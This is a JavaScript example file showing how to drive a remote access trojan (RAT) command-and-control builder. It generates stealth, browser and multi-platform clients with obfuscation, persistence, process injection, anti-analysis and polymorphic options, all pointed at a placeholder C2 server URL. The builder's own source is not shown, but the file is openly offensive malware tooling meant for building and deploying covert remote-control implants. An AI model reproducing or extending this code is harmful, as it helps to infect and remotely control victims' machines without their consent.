// Basic Usage Examples for RAT C2 Builder

const RatBuilder = require('../builder/index.js');
const ConfigBuilder = require('../builder/config-builder.js');

// Example 1: Generate a basic client
async function generateBasicClient() {
  console.log('🔨 Generating basic RAT client...');
  
  const builder = new RatBuilder();
  
  const client = builder.buildClient({
    serverUrl: 'https://your-c2-server.netlify.app',
    authToken: 'your-secure-auth-token-here',
    template: 'basic',
    obfuscate: true,
    persistence: false,
    name: 'basic_rat_client'
  });
  
  console.log('✅ Client generated:', client);
  return client;
}

// Example 2: Generate stealth client with persistence
async function generateStealthClient() {
  console.log('🕵️ Generating stealth RAT client...');
  
  const builder = new RatBuilder();
  
  const client = builder.buildClient({
    serverUrl: 'https://your-c2-server.netlify.app',
    authToken: 'your-secure-auth-token-here',
    template: 'stealth',
    obfuscate: true,
    persistence: true,
    executable: true,
    name: 'stealth_rat_client'
  });
  
  console.log('✅ Stealth client generated:', client);
  return client;
}

// Example 3: Generate browser-based client
async function generateBrowserClient() {
  console.log('🌐 Generating browser RAT client...');
  
  const builder = new RatBuilder();
  
  const client = builder.buildClient({
    serverUrl: 'https://your-c2-server.netlify.app',
    authToken: 'your-secure-auth-token-here',
    template: 'browser',
    obfuscate: true,
    persistence: false,
    name: 'browser_rat_client'
  });
  
  console.log('✅ Browser client generated:', client);
  return client;
}

// Example 4: Batch generation
async function generateBatchClients() {
  console.log('🚀 Generating batch clients...');
  
  const builder = new RatBuilder();
  
  const configurations = [
    {
      serverUrl: 'https://your-c2-server.netlify.app',
      authToken: 'your-secure-auth-token-here',
      template: 'basic',
      name: 'basic_client_1'
    },
    {
      serverUrl: 'https://your-c2-server.netlify.app',
      authToken: 'your-secure-auth-token-here',
      template: 'stealth',
      name: 'stealth_client_1'
    },
    {
      serverUrl: 'https://your-c2-server.netlify.app',
      authToken: 'your-secure-auth-token-here',
      template: 'browser',
      name: 'browser_client_1'
    }
  ];
  
  const results = builder.batchBuild(configurations);
  console.log('✅ Batch generation complete:', results);
  return results;
}

// Example 5: Using configuration presets
async function useConfigPresets() {
  console.log('⚙️ Using configuration presets...');
  
  const configBuilder = new ConfigBuilder();
  
  // Create stealth production config
  const stealthConfig = configBuilder.createPreset('stealth_production', {
    serverUrl: 'https://your-c2-server.netlify.app',
    authToken: 'your-secure-auth-token-here'
  });
  
  console.log('🕵️ Stealth config:', stealthConfig);
  
  // Create browser campaign config
  const browserConfig = configBuilder.createPreset('browser_campaign', {
    serverUrl: 'https://your-c2-server.netlify.app',
    authToken: 'your-secure-auth-token-here'
  });
  
  console.log('🌐 Browser config:', browserConfig);
  
  return { stealthConfig, browserConfig };
}

// Example 6: Custom configuration
async function customConfiguration() {
  console.log('🎛️ Creating custom configuration...');
  
  const configBuilder = new ConfigBuilder();
  
  const customConfig = configBuilder.createAdvancedConfig({
    serverUrl: 'https://your-c2-server.netlify.app',
    authToken: 'your-secure-auth-token-here',
    clientId: 'custom_advanced_client',
    heartbeatInterval: 15000,
    maxRetries: 5,
    fileOperations: true,
    shellCommands: true,
    processInjection: true,
    antiAnalysis: true,
    polymorphic: true
  });
  
  console.log('🎛️ Custom config:', customConfig);
  return customConfig;
}

// Example 7: Save and load configurations
async function saveLoadConfigurations() {
  console.log('💾 Saving and loading configurations...');
  
  const configBuilder = new ConfigBuilder();
  
  // Create and save a configuration
  const config = configBuilder.createStealthConfig({
    serverUrl: 'https://your-c2-server.netlify.app',
    authToken: 'your-secure-auth-token-here'
  });
  
  const savedPath = configBuilder.saveConfig(config, 'my_stealth_config.json');
  console.log('💾 Configuration saved to:', savedPath);
  
  // Load the configuration
  const loadedConfig = configBuilder.loadConfig('my_stealth_config.json');
  console.log('📂 Configuration loaded:', loadedConfig);
  
  return { savedPath, loadedConfig };
}

// Example 8: Generate clients with different platforms
async function multiPlatformClients() {
  console.log('🖥️ Generating multi-platform clients...');
  
  const builder = new RatBuilder();
  
  const platforms = ['win', 'linux', 'macos'];
  const results = [];
  
  for (const platform of platforms) {
    const client = builder.buildClient({
      serverUrl: 'https://your-c2-server.netlify.app',
      authToken: 'your-secure-auth-token-here',
      template: 'basic',
      executable: true,
      name: `rat_client_${platform}`,
      target: platform
    });
    
    results.push({ platform, ...client });
  }
  
  console.log('🖥️ Multi-platform clients generated:', results);
  return results;
}

// Main execution function
async function runExamples() {
  console.log('🚀 Running RAT C2 Builder Examples\n');
  
  try {
    // Run examples (commented out for safety)
    // await generateBasicClient();
    // await generateStealthClient();
    // await generateBrowserClient();
    // await generateBatchClients();
    // await useConfigPresets();
    // await customConfiguration();
    // await saveLoadConfigurations();
    // await multiPlatformClients();
    
    console.log('✅ All examples completed successfully!');
    console.log('\n📝 Note: Examples are commented out for safety.');
    console.log('   Uncomment the examples you want to run.');
    
  } catch (error) {
    console.error('❌ Example failed:', error.message);
  }
}

// Export functions for individual testing
module.exports = {
  generateBasicClient,
  generateStealthClient,
  generateBrowserClient,
  generateBatchClients,
  useConfigPresets,
  customConfiguration,
  saveLoadConfigurations,
  multiPlatformClients
};

// Run all examples if this file is executed directly
if (require.main === module) {
  runExamples();
}
